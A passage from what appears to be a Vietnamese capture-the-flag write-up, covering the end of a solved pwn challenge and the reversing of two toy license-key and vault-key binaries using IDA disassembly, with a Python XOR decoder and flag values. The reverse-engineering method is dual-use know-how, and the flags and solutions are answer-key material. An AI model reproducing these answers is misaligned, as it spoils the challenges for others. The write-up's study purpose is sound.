</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ cd /home/user_revenge
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>chall_revenge
</span></span><span style="display:flex;"><span>flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
</span></span><span style="display:flex;"><span>$ cat flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
</span></span><span style="display:flex;"><span>W1<span style="color:#f92672">{</span>g00d_exploit_idea!!!<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{g00d_exploit_idea!!!}</code></p>
<h1 id="reverse">Reverse</h1>
<h2 id="wanna-one-vpn">wanna-one vpn</h2>
<p><code>Description: wanna-one private vpn needs a license key to be authorized, help me intrude their system and I will pay you a fair price!</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/wanna-one-vpn">wanna-one-vpn</a></p>
<pre tabindex="0"><code>╭─   ~/CTF/wannagame/chall                                                           18:49:19 ─╮
╰─❯ file wanna-one-vpn                                                                           ─╯
wanna-one-vpn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bd291b1ebb7737ffcb8d0712dc093d58183f6faf, for GNU/Linux 3.2.0, not stripped
</code></pre><p>Vì đây là file ELF 64 bit (không bị stripped) nên mình load vào IDA để tiến hành dịch ngược</p>
<p>Nhìn lướt qua assembly thì mình thấy chương trình load vào 1 mảng <code>encrypted_flag</code>, nhận <code>input</code> ta nhập vào rồi so sánh độ dài 2 mảng bằng hàm <code>strlen()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span>B                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200044]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001361</span>                 sub     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001364</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001366</span>                 mov     byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000136</span>E                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001375</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span><span style="color:#ae81ff">8</span>                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>D                 mov     rbx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">80</span>                 mov     rax, cs:encrypted_flag     <span style="color:#f92672">-&gt;</span> mảng gồm các kí tự cho trước
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">87</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">8</span>A                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000138F</span>                 cmp     rbx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">92</span>                 jz      <span style="color:#66d9ef">short</span> loc_13B2
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">94</span>                 lea     rax, aInvalidLicense ; <span style="color:#e6db74">&#34;Invalid license key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>B                 mov     rdi, rax        ; format
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>E                 mov     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A3                 call    _printf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A8                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>AD                 call    _exit
</span></span></code></pre></div><p>Vậy ta phải nhập vào 1 mảng có kích thước như <code>encrypted_flag</code> 24 kí tự</p>
<p><code>.rodata:0000000000002004 a8rq9VdVyesv9Em db '^8rq9{Vd:VyesV~9|emVph6t',0</code></p>
<p>Tiếp tục, chương trình thực hiện 1 số hành động mà mình có thể dễ dàng dịch ra được:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BE loc_13BE:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>BC<span style="color:#960050;background-color:#1e0010">↓</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BE                 mov     rdx, cs:encrypted_flag
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>C5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CD                 add     rax, rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D0                 movzx   edx, byte ptr [rax]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D3                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D9                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>DB                 movzx   eax, byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E3</span>                 xor     eax, <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E6</span>                 cmp     dl, al
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E8</span>                 jz      <span style="color:#66d9ef">short</span> loc_1408
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>EA                 lea     rax, aInvalidLicense ; <span style="color:#e6db74">&#34;Invalid license key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">1</span>                 mov     rdi, rax        ; format
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">4</span>                 mov     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">9</span>                 call    _printf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span>E                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001403</span>                 call    _exit
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span> ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span> loc_1408:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">17</span>A<span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>                 add     [rbp<span style="color:#f92672">+</span>var_200048], <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span> loc_140F:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>E<span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001415</span>                 movsxd  rbx, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141</span><span style="color:#ae81ff">8</span>                 mov     rax, cs:encrypted_flag
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141F</span>                 mov     rdi, rax        ; s
</span></span></code></pre></div><p>Chương trình lưu từng byte của mảng <code>encrypted_flag</code> vào thanh ghi edx, mảng của chúng ta nhập vào cũng được load qua eax, rồi sau đó thực hiện phép xor với 9. Cuối cùng kiểm tra 2 kí tự có giống nhau không ?</p>
<p>Đến đây đã rõ ràng rồi, mình dùng code python đơn giản sau để mô phỏng lại thuật toán trên.</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/vpn.py">vpn.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>enc<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;^8rq9{Vd:VyesV~9|emVph6t&#39;</span>
</span></span><span style="display:flex;"><span>enc<span style="color:#f92672">=</span>list(enc)
</span></span><span style="display:flex;"><span>dec<span style="color:#f92672">=</span>[]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> enc:
</span></span><span style="display:flex;"><span>    dec<span style="color:#f92672">.</span>append(i<span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> dec))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{x0r_m3_plz_w0uld_ya?}</code></p>
<h2 id="wanna-one-vault">wanna-one vault</h2>
<p><code>Description: Hear me out, I disabled the security system so that I could easily dump the vault firmware, now help me decipher the firmware and break into the vault and steal their confidential intels.</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/wanna-one-vault">wanna-one-vault</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                                                                                           <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> file wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>vault                                                                                                                                          <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>vault: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB pie executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span><span style="color:#ae81ff">18e2</span>d06b27d74777cea8e784139816bfb61f45d4, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, not stripped
</span></span></code></pre></div><p>-&gt; Vẫn là 1 file ELF 64 bit (không bị stripped), mình tiến hành load vào <code>IDA</code> để dịch ngược</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000134</span>C                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001353</span>                 mov     edx, <span style="color:#ae81ff">30</span>h ; <span style="color:#e6db74">&#39;0&#39;</span>  ; nbytes
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span><span style="color:#ae81ff">8</span>                 mov     rsi, rax        ; buf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span>B                 mov     edi, <span style="color:#ae81ff">0</span>          ; fd
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001360</span>                 call    _read
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001365</span>                 mov     [rbp<span style="color:#f92672">+</span>var_2001D4], eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000136</span>B                 cmp     [rbp<span style="color:#f92672">+</span>var_2001D4], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001372</span>                 jg      <span style="color:#66d9ef">short</span> loc_137E
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001374</span>                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span><span style="color:#ae81ff">9</span>                 call    _exit
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E loc_137E:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span><span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D4]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">84</span>                 sub     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">87</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">89</span>                 mov     byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">91</span>                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">98</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>B                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A0                 cmp     rax, <span style="color:#ae81ff">20</span>h ; <span style="color:#e6db74">&#39; &#39;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A4                 jz      <span style="color:#66d9ef">short</span> loc_13BF
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A6                 lea     rax, s          ; <span style="color:#e6db74">&#34;Invalid vault key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>AD                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>B0                 call    _puts
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>B5                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BA                 call    _exit
</span></span></code></pre></div><p>Nhìn vào mã assembly, mảng chúng ta cần nhập vào phải chứa 0x20 kí tự và nhảy vào <code>loc_13CE</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CE loc_13CE:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>CD<span style="color:#960050;background-color:#1e0010">↓</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CE                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D4                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D6                 movzx   eax, byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>DE                 movsx   rdx, al
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E2</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>EA                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">2</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span>A                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001402</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span>A                 xor     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span>D                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001413</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001415</span>                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141</span>D                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001423</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001425</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000142</span>D                 shl     rax, <span style="color:#ae81ff">10</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001431</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001434</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000143</span>A                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000143</span>C                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001444</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>A                 and     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>D                 test    eax, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144F</span>                 jz      <span style="color:#66d9ef">short</span> loc_147C
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001451</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001457</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000145</span><span style="color:#ae81ff">9</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001461</span>                 xor     rax, <span style="color:#ae81ff">2070</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001467</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000146</span>A                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001470</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001472</span>                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>A                 jmp     <span style="color:#66d9ef">short</span> loc_14A5
</span></span></code></pre></div><p>Dễ thấy ở <code>rbp+var_2001D8</code> chứa biến đếm, mình tạm đặt là <code>idx</code>, thực hiện 1 số phép toán đối với từng kí tự trong mảng mình nhập vào, ta thấy sau đó có chỉ thị sau:</p>
<p>Đầu tiên là xor từng kí tự với idx, sau đó dịch trái 0x10 <code>shl rax, 10h</code> -&gt; <code>val = (y ^ idx) &lt;&lt; 0x10</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001444</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>A                 and     eax, <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Chương kiểm tra <code>idx</code> là chẵn hay lẻ, nếu chẵn sẽ nhảy tới <code>loc_147c</code>, ngược lại thì sẽ tiếp tục</p>
<p>Nễu idx chẵn sẽ xor giá trị <code>val</code> bên trên với 0x2070, còn chẵn thì sẽ tới loc_147c và xor <code>val</code> với 0x7020:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>C loc_147C:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">1E1</span><span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>C                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">82</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">84</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">8</span>C                 xor     rax, <span style="color:#ae81ff">7020</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">92</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">95</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">9</span>B                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">9</span>D                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5
</span></span></code></pre></div><p>Khái quát hóa:</p>
<pre><code>   chẵn: ((y ^ idx) &lt;&lt; 0x10) ^ 0x7020
   lẽ  : ((y ^ idx) &lt;&lt; 0x10) ^ 0x2070
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5 loc_14A5:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>C<span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>AB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>AD                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>B5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>BB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>BD                 xor     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C0                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C6                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C8                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D0                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D6                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D8                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E0</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
